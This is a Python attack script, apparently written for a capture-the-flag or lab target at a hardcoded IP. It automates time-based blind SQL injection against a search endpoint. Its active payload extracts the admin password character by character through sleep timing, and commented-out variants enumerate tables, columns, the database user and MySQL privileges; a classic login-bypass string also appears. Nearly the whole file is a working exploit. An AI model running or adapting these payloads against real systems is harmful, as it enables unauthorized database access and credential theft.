#!/usr/bin/python3
import requests
import string

ip = '157.10.160.65'
port = 8088

url = f"http://{ip}:{port}"

wait_time = 2

def login(s, username, password):
    data = {
        'username': username,
        'password': password
    }
    req = s.post(url + '/login', json=data)
    return req.text

def search(s, q):
    data = {
        'q': q
    }
    try:
        req = s.get(url + '/search', params=data, timeout=1)
    except requests.exceptions.ReadTimeout:
        return True
    if req.elapsed.total_seconds() > wait_time:
        return True
    return False

def keepAlive(s):
    req = s.get(url + '/keepAlive')
    return req.json()

def logout(s):
    req = s.get(url + '/logout')
    return req.text

if __name__ == '__main__':
    s = requests.session()

    user = "' OR '1' = '1"
    pw = 'basjdsd'

    # print(login(s, user, pw))

    leak = 'WizORpLrwY'
    i = len(leak) + 1

    wordlist = string.printable.replace('%','').replace('_','')

    while True:
        #print(i)
        for w in wordlist:
            # print(leak + w)
            # query = f"15'XOR(if((select SUBSTRING(table_name,{i},1) from information_schema.tables where table_schema=database() limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(column_name,{i},1) from information_schema.columns where table_schema=database() and table_name = 'users' limit 2,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(description,{i},1) from data limit 1,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(description,{i},1) from data WHERE description LIKE '%KSUS%' limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(username,{i},1) from users limit 1,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(database(),{i},1) from information_schema.tables limit 0,1) = '{w}', sleep(2), null))OR'"
            # query = f"15'XOR(if((select SUBSTRING(user(),{i},1) from information_schema.tables limit 0,1) = '{w}', sleep(2), null))OR'" # root
            # query = f"15'XOR(if((select SUBSTRING(execute_priv,{i},1) from mysql.user where user='root' limit 0,1) = '{w}', sleep(2), null))OR'" # root
            query = f"15'XOR(if((select SUBSTRING(password,{i},1) from users where username = 'admin' limit 0,1) like binary '{w}', sleep(2), null))OR'"

            if search(s, query):
                i += 1
                leak += w
                print(f'{leak = }', flush=True)
                break
        else:
            break